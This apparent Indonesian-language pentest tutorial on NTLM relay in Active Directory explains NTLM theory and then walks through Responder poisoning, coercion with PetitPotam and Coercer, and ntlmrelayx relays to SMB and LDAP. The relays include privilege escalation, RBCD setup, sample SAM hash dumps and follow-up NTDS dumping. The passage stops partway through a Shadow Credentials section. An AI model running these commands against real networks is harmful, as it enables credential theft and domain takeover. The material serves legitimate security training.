---
id: "41"
title: "🔁 Workflow 41 — NTLM Relay"
category: "4. Active Directory"
categoryId: "ad"
filename: "41_ntlm_relay_workflow.md"
refs_out: ["05","06","11","12","14b","35","36","39","40","42","43"]
refs_in: ["36","39","40","42","45","46","54"]
---

# 🔁 Workflow 41 — NTLM Relay

> **Category:** Active Directory / Windows Authentication  
> **Difficulty:** Intermediate → Advanced  
> **Type:** Credential Relay / NTLM Abuse / Lateral Movement / AD Modification  
> **Prerequisites:**  
> ← [**File 36: BloodHound**](/docs/ad-bloodhound)  
> ← [**File 39: AD Delegation**](/docs/ad-delegation)  
> ← [**File 40: AD CS**](/docs/adcs)  
> **Next:**  
> → [**File 42: Lateral Movement**](/docs/lateral-movement)  
> → [**File 43: Domain Persistence**](/docs/domain-persistence)

---

# 🧠 0. FONDASI NTLM

## 0.1 🪪 Apa Itu NTLM Authentication?

Bayangkan kamu masuk ke sebuah gedung.

Petugas keamanan berkata:

> "Buktikan bahwa kamu orang yang punya akses."

Kamu tidak menyerahkan password asli.

Sebaliknya:

```text
Petugas
   │
   │ "Ini challenge acak."
   ▼
KAMU
   │
   │ hitung response berdasarkan
   │ secret yang kamu miliki
   ▼
Response
   │
   ▼
Petugas memverifikasi
```

Jadi secara konsep:

```text
PASSWORD
   │
   │ tidak dikirim plaintext
   ▼
NTLM authentication
   │
   ▼
challenge-response
```

Analogi sederhananya:

> **NTLM seperti kamu membuktikan identitas dengan menunjukkan tanda tangan khusus tanpa membacakan password-mu. Masalahnya, jika proses autentikasinya dapat diteruskan oleh attacker ke server lain, attacker tidak perlu mengetahui password aslinya.**

Inilah dasar **NTLM relay**.

---

# 0.1.1 🔀 NTLMv1 vs NTLMv2 vs Net-NTLMv2

Ini salah satu sumber kebingungan terbesar pemula.

### NTLMv1

NTLMv1 adalah versi protokol challenge-response yang lebih lama.

```text
Client
  │
  ├── challenge
  │
  └── NTLMv1 response
```

NTLMv1 secara historis lebih lemah dan jauh lebih mudah diserang dibanding NTLMv2.

---

### NTLMv2

NTLMv2 memperbaiki challenge-response dengan response yang lebih kompleks.

Namun istilah:

```text
NTLMv2
```

bisa mengacu pada authentication protocol secara umum.

---

### Net-NTLMv2

`Net-NTLMv2` adalah **response material yang terlihat di network saat NTLMv2 authentication berlangsung**.

Ini bukan hal yang sama dengan NT hash password.

Mental model:

```text
NT HASH
   │
   │ digunakan sebagai secret
   ▼
NTLMv2 authentication
   │
   ▼
Net-NTLMv2 response
   │
   │ dikirim melalui network
   ▼
SERVER
```

Jadi:

```text
NT hash
   ≠
Net-NTLMv2
```

---

# 0.1.2 🧩 Kenapa NTLM Masih Dipakai?

Walaupun domain environment modern umumnya memprioritaskan Kerberos, NTLM belum hilang sepenuhnya.

Windows dapat memakai NTLM karena:

```text
1. legacy application
2. workgroup / non-domain scenarios
3. service tertentu yang tidak menggunakan Kerberos
4. hostname/IP yang tidak cocok untuk Kerberos
5. fallback authentication
6. aplikasi/protocol yang hanya mendukung NTLM
```

Secara konseptual:

```text
Kerberos available?
      │
 ┌────┴────┐
 YES       NO / unsuitable
  │              │
  ▼              ▼
Kerberos       NTLM
```

Namun jangan menganggap:

```text
"Kerberos ada"
    =
"NTLM pasti tidak digunakan"
```

Itu salah.

---

# 0.1.3 🔄 Kapan Windows Fallback ke NTLM?

Contoh klasik:

```text
Client
  │
  │ mencoba Kerberos
  ▼
KDC
  │
  └── tidak dapat memperoleh ticket
          │
          ▼
       NTLM fallback
```

Penyebab dapat berkaitan dengan:

```text
SPN tidak cocok
DNS/hostname issue
application legacy
target bukan domain principal
Kerberos unavailable
```

Inilah alasan reconnaissance tetap perlu memperhatikan NTLM walaupun domain menggunakan Kerberos.

---

# 0.2 🔄 NTLM Challenge-Response Flow

Flow dasar:

```text
CLIENT                         SERVER
  │                              │
  │── NEGOTIATE_MESSAGE ───────► │
  │                              │
  │◄── CHALLENGE_MESSAGE ─────── │
  │       challenge              │
  │                              │
  │── AUTHENTICATE_MESSAGE ─────►│
  │       response               │
  │                              │
  │◄── SUCCESS / FAILURE ────────│
```

---

## 0.2.1 📩 NEGOTIATE_MESSAGE

Client memberitahu server:

```text
"Ini kemampuan NTLM yang saya support."
```

Dapat mencakup:

```text
protocol capabilities
flags
domain/workstation information
NTLM features
```

---

## 0.2.2 🎯 CHALLENGE_MESSAGE

Server memberikan challenge.

```text
SERVER
   │
   └── 8-byte server challenge
```

Simplifikasi:

```text
Challenge = RANDOM_VALUE
```

Challenge membuat response tidak menjadi nilai statis yang sama pada setiap authentication.

---

## 0.2.3 🔐 AUTHENTICATE_MESSAGE

Client menghitung response berdasarkan:

```text
secret
+
server challenge
+
client information
+
NTLMv2 blob
```

Kemudian mengirim:

```text
AUTHENTICATE_MESSAGE
```

Response yang terlihat di network inilah yang sering disebut:

```text
Net-NTLMv2
```

---

# 0.2.4 💥 Di Mana Kelemahannya?

Bukan berarti:

```text
NTLM = kirim password
```

Karena bukan itu yang terjadi.

Masalah relay muncul karena authentication exchange dapat pada kondisi tertentu:

```text
diterima attacker
       │
       ▼
diteruskan attacker
       │
       ▼
target lain
```

Diagram:

```text
                LEGITIMATE AUTHENTICATION
CLIENT ──────────────────────────────────► SERVER

                      ATTACKER

CLIENT ───► ATTACKER ───► TARGET SERVER
              │
              │ relay
              ▼
         tidak perlu tahu
         password plaintext
```

---

# 0.2.5 🧠 Kenapa Challenge Bisa Di-relay?

Perhatikan:

```text
CLIENT
   │
   │ authenticate
   ▼
ATTACKER
   │
   │ forwards authentication exchange
   ▼
TARGET
```

Attacker tidak harus:

```text
decrypt password
```

atau:

```text
crack password
```

Dalam scenario relay, yang dibutuhkan adalah:

```text
authentication material
+
network position
+
target service yang menerima authentication
```

---

# 0.3 🧾 NTLM HASH vs NET-NTLMv2

|Aspek|NTLM Hash|Net-NTLMv2|
|---|---|---|
|Apa?|Password-derived NT hash|Challenge-response authentication material|
|Berasal dari|Password account|NTLMv2 authentication exchange|
|Terlihat di network?|Tidak secara normal|Ya, selama authentication|
|Bisa Pass-the-Hash?|✅ Ya|❌ Tidak langsung|
|Bisa di-crack offline?|✅ Ya|✅ Ya|
|Crack difficulty|Tergantung password|Umumnya lebih mahal|
|Contoh source|SAM, NTDS, secretsdump|Responder capture|
|Tool umum|`secretsdump`, Mimikatz|Responder|
|Typical use|PTH / offline authentication|Crack / relay|

---

# 0.3.1 ❗ Rule Paling Penting

```text
NTLM HASH
    │
    └── bisa digunakan dalam Pass-the-Hash
```

sedangkan:

```text
Net-NTLMv2
    │
    ├── bisa di-crack offline
    │
    └── bisa menjadi authentication material untuk relay
```

Tetapi:

```text
Net-NTLMv2
   X
   └── bukan credential yang tinggal diberikan
       ke psexec -hashes
```

---

# 0.3.2 🔬 Contoh Format Net-NTLMv2

Responder dapat menangkap format seperti:

```text
USER::DOMAIN:
SERVER_CHALLENGE:
NTLMV2_RESPONSE:
BLOB
```

Contoh:

```text
john::DOMAIN:
1122334455667788:
a1b2c3d4e5f6...:
0101000000000000...
```

Sedangkan NT hash biasanya berbentuk:

```text
31d6cfe0d16ae931b73c59d7e0c089c0
```

---

# 0.4 🔁 Apa Itu NTLM Relay?

NTLM relay adalah:

> **Attacker menerima proses authentication dari client lalu meneruskannya ke target service lain tanpa perlu mengetahui password user.**

Analogi:

```text
USER
 │
 │ "Ini bukti saya."
 ▼
ATTACKER
 │
 │ meneruskan bukti
 ▼
TARGET
 │
 │ "Authentication valid."
 ▼
ACCESS
```

---

# 0.4.1 🎭 Man-in-the-Middle Authentication

```text
CLIENT
   │
   │ NTLM Authentication
   ▼
┌─────────────┐
│   ATTACKER  │
│             │
│   RELAY     │
└──────┬──────┘
       │
       │ forwarded authentication
       ▼
    TARGET
       │
       ▼
Authenticated!
```

Yang penting:

```text
ATTACKER ≠ mengetahui password
```

---

# 0.4.2 💥 Kenapa Relay Bisa Lebih Powerful daripada Cracking?

Cracking:

```text
Captured Net-NTLMv2
       │
       ▼
offline cracking
       │
       ├── fast password → success
       └── strong password → maybe impossible
```

Relay:

```text
Captured authentication
       │
       ▼
immediately forward
       │
       ▼
target accepts
```

Jadi relay tidak bergantung langsung pada:

```text
password strength
```

tetapi pada:

```text
protocol security
+
target configuration
+
network position
```

---

# 0.4.3 ✅ Syarat Relay

### SMB Relay

Biasanya membutuhkan:

```text
SMB signing
    │
    ├── required → protected
    │
    └── not required → relay candidate
```

Selain itu:

```text
1. attacker dapat menerima authentication
2. attacker dapat mencapai target
3. target menerima NTLM
4. authentication exchange dapat diteruskan
```

---

# 0.5 🌐 Protokol yang Bisa Di-relay

|Source|Target|Tool|Catatan|
|---|---|---|---|
|SMB|SMB|`ntlmrelayx`|SMB signing pada target sangat penting|
|SMB|LDAP|`ntlmrelayx`|LDAP signing/channel binding berpengaruh|
|SMB|LDAPS|`ntlmrelayx`|TLS/CBT protection perlu diperhatikan|
|HTTP|SMB|`ntlmrelayx`|Target harus menerima NTLM|
|HTTP|LDAP|`ntlmrelayx`|Bergantung LDAP security policy|
|HTTP|AD CS|`ntlmrelayx` / Certipy|ESC8|
|WebDAV|HTTP|`ntlmrelayx`|Coercion source|
|SMB|MSSQL|`ntlmrelayx`|Bergantung SQL authentication path|
|LDAP|LDAP|Tool-specific|Sangat environment-dependent|

> **Jangan menyamakan semua relay.** Security requirements tiap protocol berbeda.

---

# 🧰 1. TOOLS & SETUP

## 1.1 🧪 Responder

Responder digunakan untuk:

```text
LLMNR poisoning
NBT-NS poisoning
mDNS poisoning
WPAD
authentication capture
```

Secara sederhana:

```text
CLIENT
  │
  │ "Di mana SERVER123?"
  ▼
LLMNR / NBT-NS
  │
  ▼
ATTACKER
  │
  └── "SERVER123 ada di sini."
```

Responder menyediakan listener untuk beberapa protocol seperti HTTP dan SMB, serta poisoner untuk LLMNR/NBT-NS/mDNS.

---

# 1.1.1 📦 Install Responder

```bash
# Check whether Responder is already installed
which responder

# Show version/help where supported
responder --help
```

Debian/Parrot package:

```bash
# Install from package repository if available
sudo apt update
sudo apt install responder -y
```

Source:

```bash
# Clone source repository
git clone https://github.com/lgandx/Responder.git

# Enter source directory
cd Responder
```

---

# 1.1.2 ⚠️ Responder vs Relay

Ini harus benar-benar dipahami.

### Responder

```text
POISON
  │
  ▼
Victim authenticates
  │
  ▼
ATTACKER captures Net-NTLMv2
```

### ntlmrelayx

```text
Victim authenticates
  │
  ▼
ATTACKER receives authentication
  │
  ▼
ATTACKER RELAYS
  │
  ▼
TARGET
```

Maka:

```text
Responder
= capture/poison

ntlmrelayx
= relay
```

---

# 1.1.3 🚨 Kenapa SMB dan HTTP Responder Harus OFF Saat Relay?

Bayangkan ada dua resepsionis:

```text
RESPONDER
   │
   └── "Saya akan menerima authentication."

NTLMRELAYX
   │
   └── "Saya juga akan menerima authentication."
```

Keduanya berebut port:

```text
TCP 445 → SMB
TCP 80  → HTTP
```

Jika Responder sudah listen:

```text
Responder
   │
   └── port 445
```

maka:

```text
ntlmrelayx
   │
   └── gagal bind port 445
```

Lebih penting lagi, Responder justru akan **terminate/authenticate locally untuk capture**, bukan meneruskannya ke target relay.

Jadi relay mode biasanya:

```text
Responder.conf

SMB = Off
HTTP = Off
```

sementara:

```text
LLMNR = On
NBT-NS = On
MDNS = On
```

dapat tetap digunakan untuk poisoning, jika memang dibutuhkan.

Source Responder menunjukkan server SMB/HTTP dijalankan berdasarkan konfigurasi `SMB_On_Off` dan `HTTP_On_Off`.

---

# 1.1.4 📝 Contoh Responder.conf untuk Relay Mode

```ini
# /etc/responder/Responder.conf

[Responder Core]

# Poisoning protocols
LLMNR = On
NBTNS = On
MDNS = On

# IMPORTANT:
# Disable local SMB server because ntlmrelayx needs TCP/445
SMB = Off

# IMPORTANT:
# Disable local HTTP server because ntlmrelayx may need TCP/80
HTTP = Off

# WPAD may be enabled only when specifically needed
WPAD = On
```

Rule:

```text
RELAY MODE
│
├── SMB  = Off
├── HTTP = Off
└── Poisoning = as needed
```

---

# 1.2 🔁 ntlmrelayx

`ntlmrelayx` adalah komponen Impacket untuk menerima authentication dan meneruskannya ke target protocol.

Basic architecture:

```text
SOURCE
   │
   │ NTLM
   ▼
ntlmrelayx
   │
   ├── SMB
   ├── LDAP
   ├── HTTP
   ├── MSSQL
   └── AD CS
```

---

# 1.2.1 📦 Install Impacket

```bash
# Check installed command
which ntlmrelayx.py

# Modern installations may expose:
which ntlmrelayx

# Show help
ntlmrelayx.py --help
```

Install:

```bash
# Install packaged Python distribution
python3 -m pip install impacket
```

Source:

```bash
# Clone the official repository
git clone https://github.com/fortra/impacket.git

# Enter source directory
cd impacket

# Install
python3 -m pip install .
```

---

# 1.2.2 🧰 Flag Penting ntlmrelayx

|Flag|Fungsi|Contoh|
|---|---|---|
|`-t`|Single relay target|`-t smb://10.10.10.20`|
|`-tf`|Target file|`-tf targets.txt`|
|`-smb2support`|SMB2 support|`-smb2support`|
|`-i`|Interactive mode|`-i`|
|`-c`|Execute command pada supported target|`-c "..."`|
|`-e`|Execute payload/file pada supported target|`-e payload.exe`|
|`--no-http-server`|Matikan HTTP listener|`--no-http-server`|
|`--no-smb-server`|Matikan SMB listener|`--no-smb-server`|
|`-l`|Output loot/log directory|`-l loot`|
|`--adcs`|AD CS relay mode|`--adcs`|
|`--delegate-access`|Delegation/RBCD-related action|`--delegate-access`|
|`--shadow-credentials`|Shadow Credentials action|`--shadow-credentials`|
|`--add-computer`|Add computer account|`--add-computer NAME PASSWORD`|
|`--escalate-user`|LDAP privilege escalation feature|`--escalate-user USER`|

> Beberapa option berubah antar versi Impacket. Jalankan `ntlmrelayx.py --help` pada instalasi Anda sebelum mengandalkan syntax tertentu.

---

# 1.2.3 🧠 `-tf` vs `-t`

```text
-t
│
└── satu target
```

Contoh:

```bash
# Relay to one SMB target
ntlmrelayx.py \
    -t "smb://$TARGET_IP" \
    -smb2support
```

Sedangkan:

```text
-tf
│
└── banyak target
```

```bash
# Relay to multiple targets
ntlmrelayx.py \
    -tf "targets.txt" \
    -smb2support
```

---

# 1.3 🔍 NetExec / CrackMapExec

NetExec berguna untuk:

```text
SMB enumeration
LDAP enumeration
signing checks
credential validation
relay target discovery
```

Check SMB:

```bash
# Enumerate SMB hosts and signing information
netexec smb 10.10.10.0/24
```

Generate relay list:

```bash
# Generate targets whose SMB signing is not required
netexec smb 10.10.10.0/24 \
    --gen-relay-list "targets.txt"
```

---

# 1.4 🧲 Coercion Tools

## PetitPotam

Primitive:

```text
MS-EFSRPC
```

Gunakan ketika:

```text
DC/Windows target
+
coercion path available
```

---

## PrinterBug / SpoolSample

Primitive:

```text
MS-RPRN / Print Spooler
```

Cocok ketika:

```text
Print Spooler
+
RPC path
```

---

## DFSCoerce

Primitive:

```text
MS-DFSNM
```

Alternative jika RPRN/EFSRPC tidak cocok.

---

## ShadowCoerce

Primitive:

```text
MS-FSRVP
```

Alternative coercion path.

---

## Coercer

`Coercer` dapat membantu mencoba beberapa coercion techniques dari satu utility.

Install:

```bash
# Install common coercion tooling
python3 -m pip install coercer
```

PetitPotam:

```bash
# Clone PetitPotam
git clone https://github.com/topotam/PetitPotam.git
```

---

# 🧭 1.4.1 Kapan Memilih Tool?

```text
Need coercion?
      │
      ├── EFSRPC available?
      │       └── PetitPotam
      │
      ├── Print Spooler path?
      │       └── PrinterBug
      │
      ├── DFS path?
      │       └── DFSCoerce
      │
      └── Unsure?
              └── Coercer
```

Jangan menganggap satu coercion technique:

```text
always works
```

Patch level, permissions, RPC configuration, firewall, and protocol hardening sangat berpengaruh.

---

# 🔎 2. RECON SEBELUM RELAY

## 2.1 🔐 Cek SMB Signing

SMB signing adalah kontrol paling penting untuk SMB relay.

Basic:

```bash
# Enumerate SMB security mode
netexec smb 10.10.10.0/24
```

Contoh output:

```text
SMB  10.10.10.5   445   FILE01   [*] Windows Server
SMB  10.10.10.5   445   FILE01   [+] signing:False

SMB  10.10.10.20  445   DC01     [*] Windows Server
SMB  10.10.10.20  445   DC01     [+] signing:True
```

Interpretation:

```text
signing:False
    ↓
SMB signing not required
    ↓
candidate for SMB relay
```

```text
signing:True
    ↓
SMB signing required
    ↓
standard SMB relay path blocked
```

Impacket's SMB relay client explicitly aborts the normal relay flow when target SMB signing is required.

---

# 2.1.1 📋 Interpretasi SMB Signing

|Output|Arti|SMB Relay?|
|---|---|---|
|`signing: False`|Signing tidak diwajibkan|✅ Candidate|
|`signing: True`|Signing diwajibkan|❌ Normal SMB relay blocked|
|`enabled but not required`|Signing tersedia tetapi optional|✅ Candidate|
|`enabled and required`|Signing enforced|❌ Protected|

---

# 2.1.2 🛰️ Nmap

```bash
# Check SMB2 security mode
nmap \
    --script smb2-security-mode \
    -p 445 \
    10.10.10.0/24
```

Contoh vulnerable:

```text
Message signing enabled but not required
```

Contoh protected:

```text
Message signing enabled and required
```

---

# 2.2 🧾 Cek LDAP Signing

Ini **berbeda** dengan SMB signing.

SMB:

```text
TCP 445
```

LDAP:

```text
TCP 389
```

LDAPS:

```text
TCP 636
```

Untuk relay ke LDAP, perhatikan:

```text
LDAP Signing
+
LDAP channel binding / LDAPS protections
```

Impacket menyediakan `CheckLDAPStatus.py`, yang secara eksplisit mendeteksi apakah LDAP signing required dan memeriksa status LDAPS channel binding. Jika server mengembalikan `strongerAuthRequired`, utility tersebut menginterpretasikannya sebagai LDAP signing enforcement.

---

# 2.2.1 🔍 Check LDAP Signing & Channel Binding

Tool `CheckLDAPStatus.py` di Impacket tidak selalu terinstall di semua distro Linux. Berikut adalah beberapa metode paling reliable untuk mengecek status LDAP signing:

```bash
# Method 1: NetExec LDAP (Paling direkomendasikan & reliable)
netexec ldap "$DC_IP" -u '' -p ''

# Method 2: Manual ldapsearch
ldapsearch -x -H "ldap://$DC_IP" -b "" -s base "(objectclass=*)" 2>&1 | head -20

# Method 3: Nmap script
nmap --script ldap-rootdse -p 389 "$DC_IP"

# Method 4: Impacket CheckLDAPStatus.py (jika script ini tersedia di system)
python3 /opt/impacket/examples/CheckLDAPStatus.py \
    -dc-ip "$DC_IP" \
    -domain "$DOMAIN"
```

### Cara Membaca Output:
- Jika mengembalikan `strongerAuthRequired` (Error 8) → **LDAP Signing Enforced** (Relay LDAP standar terblokir).
- Jika mengembalikan RootDSE info / Anonymous bind OK → **LDAP Signing NOT Enforced** (Kandidat kuat LDAP Relay).

---

# 2.2.2 `strongerAuthRequired`

Jika muncul:

```text
strongerAuthRequired
```

artinya LDAP server sedang membutuhkan security mechanism yang lebih kuat daripada simple unsigned LDAP authentication.

Simplifikasi:

```text
LDAP signing required
        │
        ▼
standard LDAP relay path
        X
```

---

# 2.2.3 🔒 LDAP vs LDAPS

```text
LDAP
TCP 389
 │
 └── signing/security negotiation

LDAPS
TCP 636
 │
 └── TLS
       │
       └── channel binding/security controls
```

Jadi:

```text
LDAP signing
    ≠
LDAPS channel binding
```

Keduanya harus dianalisis terpisah.

---

# 2.3 🎯 Identifikasi Target Valuable

Prioritas praktis:

```text
                    DOMAIN
                       │
        ┌──────────────┼───────────────┐
        │              │               │
        ▼              ▼               ▼
     Domain          File            Web
    Controller       Server         Server
        │              │               │
        ▼              ▼               ▼
      LDAP            SMB             HTTP
        │
        ▼
AD modification
```

### Prioritas

|Target|Relay Target|Potensi Impact|
|---|---|---|
|**Domain Controller**|LDAP/LDAPS|🔴 Sangat tinggi|
|**File Server**|SMB|🟠 High|
|**Web Server**|HTTP/HTTPS|🟡 Tergantung application|
|**Database Server**|MSSQL|🟠 Tergantung privilege|

---

# 🔁 3. WORKFLOW SMB → SMB

## 🖥️ 3.0 Setup Tmux Multi-Terminal (Sangat Direkomendasikan untuk Pemula)

Proses NTLM Relay membutuhkan minimal **3 terminal / panel** yang berjalan bersamaan:
1. Panel Listener Relay (`ntlmrelayx`)
2. Panel Poisoner (`Responder`)
3. Panel Coercion / Execution (`PetitPotam` / `PrinterBug` / monitoring)

Gunakan `tmux` untuk mengatur layout terminal secara rapi:

```bash
# Buka session tmux baru
tmux new -s relay

# Shortcut Split Tmux:
# Ctrl+B lalu %  -> Split Vertikal (Kanan/Kiri)
# Ctrl+B lalu "  -> Split Horizontal (Atas/Bawah)
# Ctrl+B lalu Arrow Key -> Pindah antar Panel
```

```text
┌─────────────────────────────────┬─────────────────────────────────┐
│           TERMINAL 1            │           TERMINAL 2            │
│           ntlmrelayx            │            Responder            │
│   (Relay listener di port 445)  │  (Poisoner LLMNR/NBT-NS - HTTP/ │
│                                 │   SMB Server OFF)               │
├─────────────────────────────────┴─────────────────────────────────┤
│                           TERMINAL 3                              │
│                Coercion Trigger / Monitoring Output               │
│          (PetitPotam.py / PrinterBug / NetExec / Logs)            │
└───────────────────────────────────────────────────────────────────┘
```

---

## 3.1 🧰 Setup Environment

```bash
# Attacker VPN/LAN address
export ATTACKER_IP="10.10.14.X"

# Relay target
export TARGET_IP="10.10.10.X"

# Domain
export DOMAIN="domain.local"

# Working directory
mkdir -p "ntlmrelay"/{loot,targets,logs}
```

---

# 3.2 🎯 Step 1 — Generate Target List

```bash
# Find SMB hosts where signing is not required
netexec smb 10.10.10.0/24 \
    --gen-relay-list "ntlmrelay/targets/smb_targets.txt"
```

Inspect:

```bash
# Review relay targets
cat "ntlmrelay/targets/smb_targets.txt"
```

Contoh:

```text
10.10.10.5
10.10.10.20
10.10.10.35
```

---

# 3.3 🛠️ Step 2 — Configure Responder for Relay

Edit:

```bash
# Open Responder configuration
sudo nano /etc/responder/Responder.conf
```

Pastikan:

```ini
SMB = Off
HTTP = Off
```

Konsep:

```text
Responder
   │
   ├── poison LLMNR
   ├── poison NBT-NS
   └── answer naming requests

ntlmrelayx
   │
   ├── listen SMB
   └── relay authentication
```

---

# 3.3.1 🧠 Apa yang Terjadi jika SMB Responder = On?

```text
Victim
  │
  └── authenticate
         │
         ▼
    Responder SMB
         │
         └── captures
```

Bukan:

```text
Victim
  │
  ▼
Responder
  │
  ▼
ntlmrelayx
```

Jadi:

```text
SMB = On
      ↓
Responder owns TCP/445
      ↓
bad for ntlmrelayx
```

---

# 3.4 🚀 Step 3 — Jalankan ntlmrelayx

```bash
# Relay to multiple SMB targets
sudo ntlmrelayx.py \
    -tf "ntlmrelay/targets/smb_targets.txt" \
    -smb2support \
    -l "ntlmrelay/loot"
```

Penjelasan:

```text
-tf               → target file
-smb2support      → SMB2/SMB3 support
-l                → output/loot directory
```

Single target:

```bash
# Relay to one SMB target
sudo ntlmrelayx.py \
    -t "smb://$TARGET_IP" \
    -smb2support
```

### 🖥️ Contoh Output Startup `ntlmrelayx` yang Normal:

Saat `ntlmrelayx` berhasil dijalankan, Anda akan melihat output awal seperti berikut (menandakan listener siap menerima koneksi):

```text
[*] Impacket v0.12.0.dev1 - Copyright Fortra, LLC and its affiliated companies

[*] Protocol Client SMB loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Servers started, waiting for connections...
```

> **Catatan Pemula**: Jika `ntlmrelayx` berhenti dengan error `Address already in use` pada port 445 atau 80, pastikan service `Responder` atau `smbd`/`apache2` lokal di server Anda sudah dimatikan terlebih dahulu.

---

# 3.5 🎣 Step 4 — Jalankan Responder

```bash
# Poison name resolution and capture incoming authentications
sudo responder \
    -I tun0 \
    -rdwv
```

Penjelasan:

```text
-I tun0 → interface
-r      → enable wredir responses
-d      → DHCP poisoning option
-w      → WPAD
-v      → verbose
```

Interface:

```text
VPN → tun0
LAN → eth0 / ens33 / wlan0
```

Check:

```bash
# List network interfaces
ip addr
```

---

# 3.6 🧲 Step 5 — Wait atau Coerce

### Passive

```text
Victim
  │
  └── accidental name resolution
          │
          ▼
       Attacker
```

Cocok untuk:

```text
real pentest
long-running engagement
```

---

### Active

Gunakan coercion.

```bash
# Example lab-only coercion trigger
python3 PetitPotam.py \
    "$ATTACKER_IP" \
    "$TARGET_IP"
```

Atau Coercer:

```bash
# Trigger a coercion technique through Coercer
coercer coerce \
    -l "$ATTACKER_IP" \
    -t "$TARGET_IP" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -d "$DOMAIN"
```

---

# 3.7 📊 Analisis Output ntlmrelayx

## Relay Berhasil

```text
[*] Servers started
[*] SMBD: Received connection from 10.10.10.20
[*] SMBD: Received authentication request from DOMAIN/USER
[*] Authenticating against smb://10.10.10.5 as DOMAIN/USER
[*] SMB Client: authenticating
[*] ADMIN$ is accessible
[+] Relay successful
```

---

## SAM Dump Berhasil

```text
[*] Dumping local SAM hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0...
Guest:501:aad3b435b51404eeaad3b435b51404ee:...
```

Mental model:

```text
Relay
 ↓
Authenticated SMB session
 ↓
Target accepts identity
 ↓
Administrative access
 ↓
SAM / execution
```

---

# 3.7.1 🟠 Relay Berhasil tapi Tidak Ada SAM

Contoh:

```text
[+] Relay successful
[-] Not an Administrator
[*] No SAM dump
```

Ini biasanya berarti:

```text
authentication success
       ≠
administrative authorization
```

User mungkin valid tetapi hanya memiliki:

```text
normal user rights
```

---

# 3.7.2 🔴 Relay Gagal

```text
[-] SMB SessionError:
    STATUS_ACCESS_DENIED
```

Kemungkinan:

```text
SMB signing
target hardening
insufficient rights
target rejects relayed context
```

---

# 🧬 4. SMB → LDAP

## 4.1 🔥 Kenapa LDAP Relay Lebih Powerful?

SMB relay:

```text
authenticated SMB
      │
      ▼
SMB actions
```

LDAP relay:

```text
authenticated LDAP
      │
      ▼
Active Directory
      │
 ┌────┼────────┐
 ▼    ▼        ▼
ACL  Groups   Objects
```

Jika relayed identity memiliki privilege yang sesuai:

```text
LDAP
 │
 ├── modify attribute
 ├── modify group membership
 ├── modify object
 ├── delegation-related changes
 └── certificate/shadow-credential paths
```

Jadi:

```text
SMB relay
= host-level target

LDAP relay
= directory-level target
```

---

# 4.2 🔐 Syarat LDAP Relay

Perlu memperhatikan:

```text
1. LDAP signing tidak enforced
2. LDAP/NTLM authentication path dapat diterima
3. target adalah DC/LDAP server
4. attacker dapat menerima source authentication
5. relayed identity mempunyai authorization yang berguna
```

---

# 4.2.1 🧪 Recon

```bash
# Check LDAP signing state
python3 /opt/impacket/examples/CheckLDAPStatus.py \
    -dc-ip "$DC_IP" \
    -domain "$DOMAIN"
```

---

# 4.3 🧾 Relay ke LDAP

Basic:

```bash
# Relay incoming authentication to LDAP
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support
```

Jika source connection datang melalui SMB:

```text
Victim
 │
 │ NTLM
 ▼
ntlmrelayx
 │
 │ LDAP bind
 ▼
DC LDAP
```

---

# 4.3.1 🔍 Output

```text
[*] Received connection from 10.10.10.20
[*] Authenticating against ldap://10.10.10.10 as DOMAIN/DC01$
[*] LDAP bind successful
[*] Enumerating LDAP information
```

---

# 4.4 ⚠️ LDAP Relay untuk Privilege Modification

Dalam lab yang secara eksplisit dikonfigurasi untuk menguji LDAP relay, Impacket mempunyai automation seperti:

```bash
# Example: escalate a controlled lab user through LDAP
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support \
    --escalate-user "$USERNAME"
```

Jika sukses:

```text
[*] LDAP attack starting
[+] Added DOMAIN\username to privileged group
```

### 💡 Apa yang Harus Dilakukan Setelah `--escalate-user` Sukses?
Setelah `ntlmrelayx` berhasil memasukkan user Anda ke privileged group (seperti Domain Admins atau Backup Operators):
1. **Verifikasi keanggotaan grup**:
   ```bash
   netexec smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD"
   ```
2. **Lakukan administrative action**: Karena user Anda sekarang sudah memiliki hak tinggi, Anda dapat langsung melakukan dump NTDS (`secretsdump.py`), psexec/evil-winrm ke DC, atau membaca sensitif shares.

---

# 4.4.1 🧠 Authentication vs Authorization

Ini harus tertanam:

```text
Authentication
=
"Siapa kamu?"

Authorization
=
"Apa yang boleh kamu lakukan?"
```

Maka:

```text
LDAP bind success
       ≠
Domain Admin
```

---

# 4.5 🟣 LDAP Relay → RBCD

Ini adalah jembatan ke **File 39**.

Mental model:

```text
COERCION
   │
   ▼
NTLM RELAY
   │
   ▼
LDAP
   │
   ▼
Computer object modification
   │
   ▼
RBCD
   │
   ▼
S4U
```

> **Catatan Pemula**: Resource-Based Constrained Delegation (RBCD) memungkinkan attacker mengkonfigurasi atribut `msDS-AllowedToActOnBehalfOfOtherIdentity` pada objek komputer target. Setelah atribut ini diisi dengan SID komputer yang dikontrol attacker, attacker dapat mengeksekusi S4U2Self & S4U2Proxy untuk mendapatkan TGT/Service Ticket atas nama Administrator. Detail lengkap mengenai langkah S4U2Self & S4U2Proxy dijelaskan di **[File 39: AD Delegation](/docs/ad-delegation)**.

Dalam lab dengan permission yang sesuai:

```bash
# Example RBCD-related relay operation
sudo ntlmrelayx.py \
    -t "ldap://$DC_IP" \
    -smb2support \
    --delegate-access
```

Hubungan:

```text
File 39
   │
   └── manually set RBCD

File 41
   │
   └── relay authenticated principal
       into LDAP and use resulting privilege
       for RBCD-related operations
```

← [**File 39: AD Delegation**](https://chatgpt.com/39-ad-delegation/[🔐 Workflow 39 — Active Directory Delegation](/docs/ad-delegation))

---

# 4.5.1 🧠 RBCD Relay Chain

```text
        DC / COMPUTER
             │
             │ NTLM
             ▼
         ATTACKER
             │
             │ relay
             ▼
            LDAP
             │
             │ modify computer object
             ▼
        RBCD configured
             │
             ▼
       FAKE COMPUTER
             │
             ▼
          S4U2Self
             │
             ▼
          S4U2Proxy
             │
             ▼
          TARGET
```

---

# 4.6 🟣 LDAP Relay → Shadow Credentials

Shadow Credentials memanfaatkan `msDS-KeyCredentialLink`.

Konsep:

```text
LDAP
 │
 ▼
